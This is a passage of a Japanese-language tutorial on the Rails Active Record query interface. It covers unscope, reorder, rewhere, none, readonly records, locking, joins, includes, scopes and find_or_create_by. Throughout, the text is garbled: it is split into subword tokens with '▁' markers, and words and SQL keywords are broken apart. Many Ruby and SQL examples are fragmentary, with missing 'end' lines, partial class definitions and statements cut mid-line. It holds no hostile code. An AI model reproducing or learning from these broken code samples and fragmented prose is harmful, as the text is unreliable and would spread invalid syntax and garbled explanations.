▁上の 例 では 、 1 日 あ たり 1 つの 注文 ▁( order ) ▁ オブジェクト を返します が 、 1 日 あ たり の 注文 合 計 が $ 100 を 超 え る 場合に のみ これ を行います 。
▁ 条件 を 上 書き する
▁### ▁` un scope `
▁` un scope ` を使用して 特定の 条件 を 取り 除 く ことができます 。
▁Article . where (' id ▁ > ▁10 ') . limit ( 20 ). order (' id ▁as c ') . un scope (: order )
▁ 上で 実行される SQL は 以下のような もの になります 。
▁ SELECT ▁* ▁FROM ▁ articles ▁WHERE ▁id ▁ > ▁10 ▁LIMIT ▁20
▁# ▁` un scope ` する 前 の オ リ ジ ナ ル の クエリ
▁ SELECT ▁* ▁FROM ▁ articles ▁WHERE ▁id ▁ > ▁10 ▁OR D ER ▁BY ▁id ▁as c ▁LIMIT ▁20
▁ 特定の ` where ` 句 で ` un scope ` を指定する こともできます 。
▁Article . where ( id : ▁10 , ▁ tr a sh ed : ▁false ). un scope ( where : ▁: id )
▁# ▁ SELECT ▁" articles ".
▁* ▁FROM ▁" articles " ▁WHERE ▁ tr a sh ed ▁= ▁0
▁` un scope ` を リレーション に適用 すると 、 それ に マージ される すべての リレーション にも 影 響 します 。
▁Article . order (' id ▁as c ') . merge ( Article . un scope (: order ) )
▁* ▁FROM ▁" articles "
▁### ▁` only `
▁` only ` メソッドを使用すると 、 条件 を 上 書き できます 。
▁Article . where (' id ▁ > ▁10 ') . limit ( 20 ). order (' id ▁ de sc ') . only (: order , ▁: where )
▁ SELECT ▁* ▁FROM ▁ articles ▁WHERE ▁id ▁ > ▁10 ▁OR D ER ▁BY ▁id ▁D E S C
▁# ▁` only ` を使用する 前 の オ リ ジ ナ ル の クエリ
▁ SELECT ▁" articles ".
▁* ▁FROM ▁" articles " ▁WHERE ▁( id ▁ > ▁10 ) ▁OR D ER ▁BY ▁id ▁ de sc ▁LIMIT ▁20
▁### ▁` re order `
▁` re order ` メソッドは 、 デフォルトの スコープ の 並 び 順 を 上 書き します 。
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁has _ many ▁: comments , ▁-> ▁ { ▁ order (' post ed _ at ▁D E S C ') ▁ }
▁Article . find ( 10 ). comments . re order (' name ')
▁ SELECT ▁* ▁FROM ▁ articles ▁WHERE ▁id ▁= ▁10
▁ SELECT ▁* ▁FROM ▁ comments ▁WHERE ▁ article _ id ▁= ▁10 ▁OR D ER ▁BY ▁name
▁` re order ` を実行し なかった 場合に 実行される SQL は 以下のような もの になります 。
▁ SELECT ▁* ▁FROM ▁ comments ▁WHERE ▁ article _ id ▁= ▁10 ▁OR D ER ▁BY ▁ post ed _ at ▁D E S C
▁### ▁` reverse _ order `
▁` reverse _ order ` メソッドは 、 並 び 順 が 指定 されている 場合に 並 び 順 を 逆 に します 。
▁Client . where (" orders _ count ▁ > ▁10 ") . order (: name ). reverse _ order
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁ orders _ count ▁ > ▁10 ▁OR D ER ▁BY ▁name ▁D E S C
▁ SQL クエリ で 並 び 順 を指定する 句 がない 場合に ` reverse _ order ` を実行すると 、 主キー の 逆 順 になります 。
▁Client . where (" orders _ count ▁ > ▁10 ") . reverse _ order
▁このメソッドは 引数 を ** 取り ません ** 。
▁### ▁` re where `
▁` re where ` メソッドは 、 既存の where 条件 を 上 書き します 。
▁Article . where ( tr a sh ed : ▁true ). re where ( tr a sh ed : ▁false )
▁ SELECT ▁* ▁FROM ▁ articles ▁WHERE ▁` tr a sh ed ` ▁= ▁0
▁` re where ` の代わりに ` where ` を 2 回 使用する と 、 結果 が 異なります 。
▁Article . where ( tr a sh ed : ▁true ). where ( tr a sh ed : ▁false )
▁ 上で 実行される SQL は 以下のような もの になります 。
▁ SELECT ▁* ▁FROM ▁ articles ▁WHERE ▁` tr a sh ed ` ▁= ▁1 ▁ AND ▁` tr a sh ed ` ▁= ▁0
▁ N ul l リレーション
▁-- -----------
▁` n one ` メソッドは 、 連 鎖 ▁( cha in ) ▁ 可能な リレーション を返します ▁( レコード は 返 しません )。
▁このメソッド から 返 された リレーション に ど のような 条件 を 連 鎖 させ ても 、 常に 空 の リレーション が 生成されます 。
▁これは 、 メソッド または スコープ への 連 鎖 可能な 応答 が 必要 で 、 しか も 結果を 一 切 返 し たくない 場合に 便利です 。
▁Article . n one ▁# ▁ 空 の リレーション を返し 、 クエリ を生成し ない 。
▁# ▁ v is i b le _ articles ▁ メソッドは リレーション を 1 つ 返す ことが 期 待 されている
▁@ articles ▁= ▁ current _ user . v is i b le _ articles . where ( name : ▁ params [: name ] )
▁def ▁ v is i b le _ articles
▁ case ▁ r ol e
▁ w h en ▁' Co un t ry ▁Ma n age r '
▁Article . where ( count ry : ▁ count ry )
▁ w h en ▁' Re view er '
▁Article . publish ed
▁ w h en ▁' B ad ▁User '
▁Article . n one ▁# ▁=> ▁ この場合 [ ] または nil を返し 、 呼び出し 側 の コードを 中 断 する
▁ 読み 取り 専 用 オブジェクト
▁Active ▁Record には 、 返 された どの オブジェクト に対して も 変更を 明示的に 禁 止 する ` read only ` メソッド があります 。
▁ 読み 取り 専 用 を 指定された オブジェクト に対する 変更 の 試 み はすべて 失敗 し 、` ActiveRecord :: Re ad O n ly Re c or d ` 例外が発生します 。
▁ client ▁= ▁Client . read only . first
▁ client . v is it s ▁+ = ▁1
▁ client . save
▁上のコードでは ▁` client ` に対して 明示的に ` read only ` が 指定 されている ため 、 ▁ _ v is it s _ ▁ の値 を更新し て ▁` client . save ` を行なう と ` ActiveRecord :: Re ad O n ly Re c or d ` 例外が発生します 。
▁ レコード を 更新 できない よう ロ ッ ク する
▁ ロ ッ ク は 、 データベースの レコード を更新する 際 の 競 合 状態 を 避 け 、 ア ト ミ ッ ク な ▁( = 中 途 半 端 な 状態 の ない ) ▁ 更新 を行なう ために 有 用 です 。
▁Active ▁Record には 2 とおり の ロ ッ ク 機 構 があります 。
▁* ▁ 楽 観 的 ロ ッ ク ▁( o p t im is tic )
▁* ▁ 悲 観 的 ロ ッ ク ▁( p ess im is tic )
▁### ▁ 楽 観 的 ロ ッ ク ▁( o p t im is tic )
▁ 楽 観 的 ロ ッ ク では 、 複数の ユーザーが 同じ レコード を 編集 すること を 許 し 、 データ の 衝 突 が 最 小 限 であることを 仮 定 しています 。
▁この 方法 では 、 レコード が オープン されて から 変更 された こと がある かどうかをチェックし ます 。
▁ そのような 変更 が行われ 、 かつ 更新 が 無視 された 場合 、` ActiveRecord :: S t al e Object Error ` 例外が発生します 。
▁** 楽 観 的 ロ ッ ク カラム **
▁ 楽 観 的 ロ ッ ク を使用する には 、 テーブル に ` lock _ version ` という名前の integer 型 カラム がある 必要があります 。
▁Active ▁Record は 、 レコード が 更新 される たびに ` lock _ version ` カラム の 値を 1 ず つ 増 や します 。
▁ 更新 リクエスト が発生し たとき の ` lock _ version ` の 値が データベース 上の ` lock _ version ` カラム の値 よりも 小 さ い 場合 、 更新 リクエスト は 失敗 し 、` ActiveRecord :: S t al e Object Error ` エラーが発生し ます 。
▁ 例 :
▁c 1 ▁= ▁Client . find (1)
▁c 2 ▁= ▁Client . find (1)
▁c 1 . first _ name ▁= ▁" Michael "
▁c 1 . save
▁c 2 . name ▁= ▁" sh o ul d ▁ fa il "
▁c 2 . save ▁# ▁ActiveRecord :: S t al e Object Error を 発生
▁ 例外 の 発生 後 、 この 例外 を レ ス キュー することで 衝 突 を 解決 する必要があります 。 衝 突 の 解決 方法は 、 ロー ル バ ッ ク 、 マージ 、 または ビ ジ ネ ス ロ ジ ッ ク に 応 じ た 解決 方法 のいずれか を使用して ください 。
▁` ActiveRecord :: Base . lock _ o p t im ist ical ly ▁= ▁false ` を設定する と この 動作 をオフに できます 。
▁` ActiveRecord :: Base ` には 、` lock _ version ` カラム 名を 上 書き するための ` lock ing _ column ` が 用意されてい ます 。
▁self . lock ing _ column ▁= ▁: lock _ client _ column
▁### ▁ 悲 観 的 ロ ッ ク ▁( p ess im is tic )
▁ 悲 観 的 ロ ッ ク では 、 データベース が提供する ロ ッ ク 機 構 を使用します 。
▁ リレーション の 構 築 時に ` lock ` を使用すると 、 選択 した 行 に対する 排 他 的 ロ ッ ク を 取得 できます 。
▁` lock ` を使用する リレーション は 、 デ ッ ド ロ ッ ク 条件 を 回 避 するために 通常 ト ラ ン ザ ク ション の 内 側 に ラ ッ プ されます 。
▁I te m . tr an s action ▁do
▁ i ▁= ▁I te m . lock . first
▁ i . name ▁= ▁' J one s '
▁ i . save !
▁ バ ッ ク エ ンド で MySQL を 使用している 場合 、 上の セッション によって 以下の SQL が 生成されます 。
▁B E G IN
▁I te m ▁ L o ad ▁( 0 . 3 m s ) ▁ SELECT ▁* ▁FROM ▁` item s ` ▁LIMIT ▁1 ▁F O R ▁ U P DAT E
▁I te m ▁ U p date ▁( 0 . 4 m s ) ▁ U P DAT E ▁` item s ` ▁S E T ▁` updated _ at ` ▁= ▁' 200 9 - 0 2 - 07 ▁ 18 : 0 5 : 5 6 ', ▁` name ` ▁= ▁' J one s ' ▁WHERE ▁` id ` ▁= ▁1
▁ SQL ▁( 0 . 8 m s ) ▁C O M M I T
▁ 異なる 種類 の ロ ッ ク を使用したい場合 、` lock ` メソッド に 生 の SQL を 渡す こともできます 。
▁たとえば 、 MySQL には ` L O C K ▁ IN ▁S H A RE ▁ M O D E ` という 式 があります 。 これは レコード の ロ ッ ク 中に も 他の クエリ から の 読み出し は 許可 する ものです 。
▁この 式 を指定する には 、 単 に lock オプション の 引数に します 。
▁ i ▁= ▁I te m . lock (" L O C K ▁ IN ▁S H A RE ▁ M O D E ") . find (1)
▁ i . in c re m ent ! (: views )
▁ モデルの インスタンス が 既に ある 場合は 、 ト ラ ン ザ ク ション を 開 始 して そ の中で ロ ッ ク を 一度 に 取得 できます 。
▁ item ▁= ▁I te m . first
▁ item . with _ lock ▁do
▁# ▁この ブロック は ト ラ ン ザ ク ション 内で 呼び出される
▁# ▁ item は ロ ッ ク 済み
▁ item . in c re m ent ! (: views )
▁ テーブル を 結合 する
▁-- - -----------
▁Active ▁Record の 検索 メソッド には ` join s ` があり 、 生成された SQL で ` J O IN ` 句 を使用できます 。 ` join s ` メソッド には さまざまな 使用 方法 があります 。
▁### ▁ SQL フラグ メ ン ト 文字列 を使用する
▁` join s ` メソッドの 引数に 生 の SQL を指定する ことで ` J O IN ` 句 を 指定できます 。
▁Client . join s (' L E F T ▁ O UT ER ▁JOIN ▁ address es ▁ ON ▁ address es . client _ id ▁= ▁clients . id ')
▁これ によって 以下の SQL が 生成されます 。
▁ SELECT ▁clients .
▁* ▁FROM ▁clients ▁ L E F T ▁ O UT ER ▁JOIN ▁ address es ▁ ON ▁ address es . client _ id ▁= ▁clients . id
▁### ▁ 名前付き 関連付け の配列 / ハッシュ を使用する
▁WARN ING : ▁このメソッドは ` IN N ER ▁JOIN ` で しか 使用 できません 。
▁Active ▁Record では 、` join s ` メソッドを使用して 関連付け で ` J O IN ` 句 を指定する 際に 、 モデル で 定義された 関連付け の名前 を シ ョ ート カ ッ ト として 使用できます ▁( 詳 細 は [ Active ▁Record の 関連付け ]( association _ basic s . html ) を参照 )。
▁たとえば 、 以下の ` C at e g or y `、` Article `、` Comment `、` G u e st `、` T a g ` モデル について 考えてみましょう 。
▁class ▁C at e g or y ▁< ▁ActiveRecord :: Base
▁has _ many ▁: articles
▁ belongs _ to ▁: category
▁has _ many ▁: comments
▁has _ many ▁: tag s
▁class ▁ Comment ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: article
▁has _ one ▁: guest
▁ belongs _ to ▁: comment
▁class ▁ T a g ▁< ▁ActiveRecord :: Base
▁以下の すべて において 、` IN N ER ▁JOIN ` を使用した 結合 クエリ が 期待どおり に 生成 されています 。
▁#### ▁ 単 一 関連付けを 結合 する
▁C at e g or y . join s (: articles )
▁ 上 によって 以下 が 生成されます 。
▁ SELECT ▁categories .
▁* ▁FROM ▁categories
▁ IN N ER ▁JOIN ▁ articles ▁ ON ▁ articles . category _ id ▁= ▁categories . id
▁上の SQL を 日 本 語 で 書く と 「 記事 ▁( article ) ▁ のある すべての カ テ ゴ リ ー を含む 、 C at e g or y オブジェクトを 1 つ 返す 」 となります 。
▁なお 、 同じ カ テ ゴ リ ー に 複数の 記事 がある場合 、 カ テ ゴ リ ー が 重複 します 。
▁ 重複 の ない 一意 の カ テ ゴ リ ー が 必要な 場合は 、` C at e g or y . join s (: article ). un i q ` を使用できます 。
▁#### ▁ 複数の 関連付けを 結合 する
▁Article . join s (: category , ▁: comments )
▁ SELECT ▁ articles .
▁* ▁FROM ▁ articles
▁ IN N ER ▁JOIN ▁categories ▁ ON ▁ articles . category _ id ▁= ▁categories . id
▁ IN N ER ▁JOIN ▁ comments ▁ ON ▁ comments . article _ id ▁= ▁ articles . id
▁上の SQL を 日 本 語 で 書く と 、「 カ テ ゴ リ ー が 1 つ あり 、 かつ コメント が 1 つ 以上 ある 、 すべての 記事 を返す 」 となります 。
▁ こ ち ら も 、 コメント が 複 数 ある 記事 は 複 数 回 表示 されます 。
▁#### ▁ ネスト した 関連付けを 結合 する ▁( 単 一 レベル )
▁Article . join s ( comments : ▁: guest )
▁ IN N ER ▁JOIN ▁ guest s ▁ ON ▁ guest s . comment _ id ▁= ▁ comments . id
▁上の SQL を 日 本 語 で 書く と 、「 ゲ スト による コメント が 1 つ ある 記事 をすべて 返す 」 となります 。
▁#### ▁ ネスト した 関連付けを 結合 する ▁( 複 数 レベル )
▁C at e g or y . join s ( articles : ▁[ { ▁ comments : ▁: guest ▁ } , ▁: tag s ] )
▁ IN N ER ▁JOIN ▁ tag s ▁ ON ▁ tag s . article _ id ▁= ▁ articles . id
▁### ▁ 結合 された テーブル で 条件 を指定する
▁ 標準 の [ 配列 ]( # 配列 で 表 された 条件 ) および [ 文字列 ]( # 文字列 だけで 表 された 条件 ) 条件 を使用して 、 結合テーブル に 条件 を指定する ことができます 。
▁[ ハッシュ 条件 ]( # ハッシュ を使用した 条件 ) の場合 、 結合テーブル で 条件 を指定する 場合に 特殊な 構 文 を使用します 。
▁ time _ range ▁= ▁( Time . now . m id n ig h t ▁- ▁1. day ). .
▁Client . join s (: orders ). where (' orders . created _ at ' ▁=> ▁ time _ range )
▁さらに 読み やすい 別の 方法 として 、 ハッシュ 条件 を ネスト させる 方法 があります 。
▁Client . join s (: orders ). where ( orders : ▁ { ▁ created _ at : ▁ time _ range ▁ })
▁ このコード では 、 昨 日 作成された 注文 ▁( order ) ▁ を持つ すべての クライアント を 検索 します 。 ここで も SQL の ` B E T W EEN ` 式 を使用しています 。
▁ 関連付けを 一 括 読み込み する
▁ 一 括 読み込み ▁( eager ▁ load ing ) ▁ とは 、` Model . find ` によって 返される オブジェクト に 関連付けられた レコード を 読み込む ための メ カ ニ ズ ム であり 、 できる だけ クエリ の 使用 回 数 を 減 ら す ようにします 。
▁** N ▁+ ▁1 クエリ 問題 **
▁ 以下のコード について 考えてみましょう 。 クライアント を 10 人 検索 して 郵 便 番号 を表示します 。
▁clients ▁= ▁Client . limit ( 10 )
▁clients . each ▁do ▁| client |
▁ put s ▁ client . address . post code
▁このコードは 一 見 何 の 問題 も ないように 見え ます 。
▁しかし 本 当 の 問題 は 、 実行 された クエリ の 回 数 が 無 駄 に 多 い こと な のです 。
▁上のコードでは 、 最初に クライアント を 10 人 検索 するのに クエリ を 1 回 発 行 し 、 次に そこ から 住 所 を 取り出す の に クエリ を 10 回 発 行 します ので 、 合 計 で ▁** 11 ** ▁ 回 の クエリ が 発 行 されます 。
▁** N ▁+ ▁1 クエリ 問題 を 解決 する **
▁Active ▁Record は 、 読み込まれ る すべての 関連付けを 事 前に 指定 することができます 。
▁これは 、` Model . find ` 呼び出し で ` include s ` を指定する ことで 実現 できます 。
▁` include s ` を指定すると 、 Active ▁Record は 指定された すべての 関連付け が 最 小 限 の クエリ 回 数 で 読み込まれ るように してくれます 。
▁上の 例 で言う と 、` Client . limit ( 10 ) ` という コードを 書き 直 して 、 住 所 が 一 括 で 読み込まれ るように します 。
▁clients ▁= ▁Client . include s (: address ). limit ( 10 )
▁ 最初の 例 では ▁** 11 ** ▁ 回 も クエリ が 実行 されました が 、 今 度 の例 では わずか ▁** 2 ** ▁ 回 に まで 減 り ました 。
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁10
▁ SELECT ▁ address es .
▁* ▁FROM ▁ address es
▁WHERE ▁( address es . client _ id ▁ IN ▁( 1 , 2, 3, 4 , 5 , 6 , 7 , 8 , 9 , 10 ) )
▁### ▁ 複数の 関連付けを 一 括 で 読み込む
▁Active ▁Record は 、 1 つの ` Model . find ` 呼び出し で 関連付けを い く つ でも 一 括 読み込み することができます 。 これ を行なう には 、` include s ` メソッドで 配列 、 ハッシュ 、 または 、 配列 や ハッシュの ネスト した ハッシュ を使用します 。
▁#### ▁ 複数の 関連付け の配列
▁Article . include s (: category , ▁: comments )
▁上のコードは 、 記事 と 、 それ に 関連付けられた カ テ ゴ リ や コメント をすべて 読み込み ます 。
▁#### ▁ ネスト した 関連付け ハッシュ
▁C at e g or y . include s ( articles : ▁[ { ▁ comments : ▁: guest ▁ } , ▁: tag s ] ). find (1)
▁上のコードは 、 id = 1 の カ テ ゴ リ を 検索 し 、 関連付けられた すべての 記事 と その タグ や コメント 、 および すべての コメント の ゲ スト 関連付けを 一 括 読み込み します 。
▁### ▁ 関連付け の 一 括 読み込み で 条件 を指定する
▁Active ▁Record では 、` join s ` のように 事 前 読み込み された 関連付け に対して 条件 を指定する ことができます が 、[ join s ]( # テーブル を 結合 する ) ▁という 方法 を使用する ことをお勧めします 。
▁しかし 、 この ように せ ざ る を 得 ない場合は 、` where ` を 通常 ど お り に 使用 することができます 。
▁Article . include s (: comments ). where ( comments : ▁ { ▁ v is i b le : ▁true ▁ })
▁このコードは 、` L E F T ▁ O UT ER ▁JOIN ` を含む クエリ を 1 つ 生成 します 。 ` join s ` メソッドを使用して い たら 、 代りに ` IN N ER ▁JOIN ` を使用する クエリ が生成され ていた でしょう 。
▁ SELECT ▁" articles ". " id " ▁A S ▁t 0 _ r 0, ▁ ... ▁" comments ". " updated _ at " ▁A S ▁t 1 _ r 5 ▁FROM ▁" articles " ▁ L E F T ▁ O UT ER ▁JOIN ▁" comments " ▁ ON ▁" comments ". " article _ id " ▁= ▁" articles ". " id " ▁WHERE ▁( comments . v is i b le ▁= ▁1 )
▁` where ` 条件 が ない場合は 、 通常の クエリ が 2 セット 生成されます 。
▁NOT E : ▁` where ` が この ように 動作する のは 、 ハッシュ を 渡 した 場合 だけです 。
▁Article . include s (: comments ). where (" comments . v is i b le ▁= ▁true ") . ref er en ce s (: comments )
▁この ` include s ` クエリ の場合 、 どの 記事 にも コメント が つ い ていない ので 、 すべての 記事 が 読み込まれ ます 。
▁` join s ` ▁( IN N ER ▁JOIN ) ▁ を使用する場合 、 結合 条件 は 必ず マッチ ▁** し なければ な らず ** ▁ 、 それ以外の 場合には レコード は 返 されません 。
▁ スコープ
▁ スコープ を設定する ことで 、 関連 オブジェクト や モデル への メソッド 呼び出し として 参 照 される 、 よく 使用される クエリ を指定する ことができます 。
▁ スコープ では 、` where `、` join s `、` include s ` など 、 これまで に 登 場 した すべての メソッド を使用できます 。
▁ どの スコープ メソッド も 、 常に ` ActiveRecord :: Re l ation ` オブジェクト を返します 。 この オブジェクト に対して 、 別の スコープ を含む 他の メソッド 呼び出し を行なう こともできます 。
▁ 単純な スコープ を設定する には 、 クラスの 内部で ` scope ` メソッド を使用し 、 スコープ が 呼び出され たとき に 実行 して 欲 しい クエリ を そこで 渡します 。
▁ scope ▁: publish ed , ▁-> ▁ { ▁ where ( publish ed : ▁true ) ▁ }
▁ 以下 でも わかるように 、 スコープ で の メソッド の設定 は 、 クラス メソッドの 定義 と 完全に 同じ ▁( という より クラス メソッドの 定義 そのもの ) ▁ です 。 どちら の 形式 を使用する か は 好 み の 問題 です 。
▁def ▁self . publish ed
▁ where ( publish ed : ▁true )
▁ スコープ を スコープ 内で 連 鎖 ▁( cha in ) ▁ させる こともできます 。
▁ scope ▁: publish ed , ▁-> ▁ { ▁ where ( publish ed : ▁true ) ▁ }
▁ scope ▁: publish ed _ and _ comment ed , ▁-> ▁ { ▁ publish ed . where (" comments _ count ▁ > ▁0 ") ▁ }
▁この ` publish ed ` スコープ を呼び出す には 、 クラス で この スコープ を呼び出します 。
▁ category ▁= ▁C at e g or y . first
▁ category . articles . publish ed ▁# ▁=> ▁[ この カ テ ゴ リ に 属 する 、 公開 済み の 記事 ]
▁### ▁ 引数 を 渡す
▁ スコープ には 引数 を 渡す ことができます 。
▁ scope ▁: created _ before , ▁-> ( time ) ▁ { ▁ where (" created _ at ▁< ▁ ? ", ▁ time ) ▁ }
▁ 引数 付き スコープ の 呼び出し は 、 クラス メソッドの 呼び出し と同様 の 方法で 行います 。
▁Article . created _ before ( Time . zone . now )
▁しかし 、 この スコープ で できる 機能 は 、 クラス メソッドで できる 機能 と 重複 しています 。
▁def ▁self . created _ before ( time )
▁ where (" created _ at ▁< ▁ ? ", ▁ time )
▁ スコープ で 引数 を使用する のであれば 、 クラス メソッド として 定義 する 方が 推 奨 されます 。
▁ クラス メソッド に した 場合 でも 、 関連 オブジェクト から アクセス 可能です 。
▁ category . articles . created _ before ( time )
▁### ▁ デフォルト スコープ を 適 用 する
▁ ある スコープ を モデルの すべての クエリ に適用 したい場合 、 モデル 自身 の 内部で ` default _ scope ` メソッド を使用する ことができます 。
▁ default _ scope ▁ { ▁ where (" remove d _ at ▁I S ▁ NULL ") ▁ }
▁この モデル に対して クエリ が 実行 された とき の SQL クエリ は 以下のような感じ になります 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁ remove d _ at ▁I S ▁ NULL
▁ デフォルト スコープ の 条件 が 複 雑 になる のであれば 、 スコープ を クラス メソッド として 定義 する の も ひとつ の 手 です 。
▁def ▁self . default _ scope
▁# ▁ActiveRecord :: Re l ation を返す ように する
▁### ▁ スコープ の マージ
▁` where ` 句 と同様 、` AND ` 条件 を使用して スコープ を マージ できます 。
▁class ▁User ▁< ▁ActiveRecord :: Base
▁ scope ▁: active , ▁-> ▁ { ▁ where ▁ state : ▁' active ' ▁ }
▁ scope ▁: in active , ▁-> ▁ { ▁ where ▁ state : ▁' in active ' ▁ }
▁User . active . in active
▁# ▁ SELECT ▁" users ".
▁* ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' active ' ▁ AND ▁" users ". " state " ▁= ▁' in active '
▁` scope ` と ` where ` 条件 を 混 用 して マッチ させる ことができます 。 その 結果 生成される 最終的な SQL には 、 すべての 条件 が ` AND ` で 結合 されて 使用されます 。
▁User . active . where ( state : ▁' f in i sh ed ')
▁* ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' active ' ▁ AND ▁" users ". " state " ▁= ▁' f in i sh ed '
▁User . active . merge ( User . in active )
▁* ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' in active '
▁ここで ひとつ 注意 し なければならない のは 、` default _ scope ` を ` scope ` や ` where ` 条件 よりも 前に 置 い ている という 点 です 。
▁ default _ scope ▁ { ▁ where ▁ state : ▁' p end ing ' ▁ }
▁User . all
▁* ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' p end ing '
▁User . active
▁* ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' p end ing ' ▁ AND ▁" users ". " state " ▁= ▁' active '
▁User . where ( state : ▁' in active ')
▁# ▁ SELECT ▁" users ". * ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' p end ing ' ▁ AND ▁" users ". " state " ▁= ▁' in active '
▁上の 例 で わかるように 、` default _ scope ` が ` scope ` と ` where ` よりも 前 の 場所 に マージ されています 。
▁### ▁ すべての スコープ を削除する
▁ 何らかの 理由 で スコープ をすべて 解 除 したい場合は ` un scope d ` メソッド を使用できます 。
▁このメソッドは 、 モデル で ` default _ scope ` が 指定 されている が 、 それ を 適 用 し たくない クエリ がある場合 に 特に 便利です 。
▁Client . un scope d . load
▁このメソッドは スコープ をすべて 解 除 し 、 テーブル に対して 通常の ▁( スコープ な し の ) ▁ クエリ を実行する ようにします 。
▁` un scope d ` に ` scope ` を 連 鎖 させる ことはできません ので 注意 が必要です 。
▁ このような 場合は 、` un scope d ` の ブロック 形式 を使用すること が 推 奨 されます 。
▁Client . un scope d ▁ {
▁Client . created _ before ( Time . zone . now )
▁ 動的 フ ァ イン ダ
▁Active ▁Record は 、 テーブル に 定義された すべての フィールド ▁( 属性 とも 呼ばれ ます ) ▁ に対して 自動的に フ ァ イン ダ メソッド を提供します 。
▁たとえば 、` Client ` モデルに ` first _ name ` という フィールド がある と 、` find _ by _ first _ name ` という メソッドが Active ▁Record によって自動的に 作成されます 。
▁` Client ` モデルに ` lock ed ` という フィールド があれば 、` find _ by _ lock ed ` という メソッド を使用できます 。
▁この 動的 フ ァ イン ダ メソッドの 末尾 に ` Client . find _ by _ name ! (" Ryan ") ` のように 感 嘆 符 ▁( ` !` ) ▁ を追加する と 、 該当する レコード がない 場合に ` ActiveRecord :: Re c or d No t F ound ` エラーが発生し ます 。
▁name と lock ed の 両方 を 検索 したい のであれば 、 2 つの フィールド 名を and で つ な ぐ だけで メソッドを 利用 できます 。
▁たとえば 、` Client . find _ by _ first _ name _ and _ lock ed (" Ryan ", ▁true ) ` のように か く ことができます
▁ 新しい オブジェクトを 検索 または ビ ル ド する
▁Active ▁Record
▁ レコード を 検索 し 、 レコード が なければ 作成する 、 という のは よく ある 一 連 の 流れ です 。
▁` find _ or _ create _ by ` および ` find _ or _ create _ by !` メソッド を使用すれば これら を 一度 に 行なう ことができます 。
▁### ▁` find _ or _ create _ by `
▁` find _ or _ create _ by ` メソッドは 、 指定された 属性 を持つ レコード が存在する かどうかをチェックし ます 。
▁ レコード が ない場合は ` create ` が 呼び出され ます 。
▁以下の 例 を見てみましょう 。
▁' A n d y ' という名前の クライアント を探し 、 い なければ 作成した い とします 。
▁これ を行なう には 以下 を実行します 。
▁Client . find _ or _ create _ by ( first _ name : ▁' A n d y ')
▁# ▁=> ▁#< Client ▁id : ▁1, ▁ first _ name : ▁" A n d y ", ▁ orders _ count : ▁ 0, ▁ lock ed : ▁true , ▁ created _ at : ▁" 20 11 - 08 - 30 ▁ 06 : 0 9 : 27 ", ▁ updated _ at : ▁" 20 11 - 08 - 30 ▁ 06 : 0 9 : 27 ">
▁このメソッド によって 生成される SQL は 以下のような もの になります 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . first _ name ▁= ▁' A n d y ') ▁LIMIT ▁1
▁ IN S ER T ▁ IN T O ▁clients ▁( created _ at , ▁ first _ name , ▁ lock ed , ▁ orders _ count , ▁ updated _ at ) ▁ V A L U E S ▁( ' 20 11 - 08 - 30 ▁0 5 : 22 : 5 7 ', ▁' A n d y ', ▁1, ▁ NULL , ▁' 20 11 - 08 - 30 ▁0 5 : 22 : 5 7 ')
▁C O M M I T
▁` find _ or _ create _ by ` は 、 既に ある レコード か 新しい レコード のいずれか を返します 。
▁上の 例 の場合 、 A n d y という名前の クライアント が なかった ので レコード を作成して 返 しました 。
▁` create ` など と同様 、 検証 に パス する かどうか によって 、 新しい レコード が データベースに保存 されていない こと がある かもしれません 。
▁今度は 、 新しい レコード を作成する ときに ' lock ed ' 属性を ` false ` に設定し たい が 、 それ を クエリ に含め たくない とします 。
▁ そこで 、 " A n d y " という名前の クライアント を検索する か 、 その 名前 の クライアント が い ない場合は " A n d y " という クライアント を作成して ロ ッ ク を 外 す ことにします 。
▁これは 2 とおり の 方法で 実装 できます 。
▁1 つ 目 は ` create _ with ` を使用する 方法 です 。
▁Client . create _ with ( lock ed : ▁false ). find _ or _ create _ by ( first _ name : ▁' A n d y ')
▁2 つ 目 は ブロック を使用する 方法 です 。
▁Client . find _ or _ create _ by ( first _ name : ▁' A n d y ') ▁do ▁| c |
▁c . lock ed ▁= ▁false
▁この ブロック は 、 クライアント が 作成される ときに だけ 実行されます 。
▁この コードを 再度 実行 すると 、 この ブロック は 実行 されません 。
▁### ▁` find _ or _ create _ by !
▁` find _ or _ create _ by !` を使用すると 、 新しい レコード が 無効な 場合に 例外を発生 することもできます 。
▁ 検証 ▁( validation ) ▁ については 本ガイドで は 解 説 していません が 、 たとえば
▁validates ▁: orders _ count , ▁ presence : ▁true
▁ 上 を ` Client ` モデル に追加 した とします 。
▁` orders _ count ` を 指定 しない で 新しい ` Client ` モデル を作成し よう と すると 、 レコード は 無効 になって 例外が発生します 。
▁ first _ name : ▁' A n d y ')
▁# ▁=> ▁ActiveRecord :: Re c or d In valid : ▁ V al id ation ▁ failed : ▁ Order s ▁ count ▁c an ' t ▁be ▁ blank
▁### ▁` find _ or _ initialize _ by `
▁` find _ or _ initialize _ by ` メソッドは ` find _ or _ create _ by ` と同様に 動作します が 、` create ` の 代りに ` new ` を 呼 ぶ 点が 異なります 。
▁つまり 、 モデルの 新しい インスタンス は 作成されます が 、 その 時点 では データベースに保存 されていません 。
▁` find _ or _ create _ by ` の例 を 少し 変え て 説明 を 続 け ます 。 今度は ' N i c k ' という名前の クライアント が 必要 だと します 。
▁ n i c k ▁= ▁Client . find _ or _ initialize _ by ( first _ name : ▁' N i c k ')
▁# ▁=> ▁< Client ▁id : ▁nil , ▁ first _ name : ▁" N i c k ", ▁ orders _ count : ▁ 0, ▁ lock ed : ▁true , ▁ created _ at : ▁" 20 11 - 08 - 30 ▁ 06 : 0 9 : 27 ", ▁ updated _ at : ▁" 20 11 - 08 - 30 ▁ 06 : 0 9 : 27 ">
▁ n i c k . per s ist ed ?
▁# ▁=> ▁false
▁ n i c k . new _ record ?
▁# ▁=> ▁true
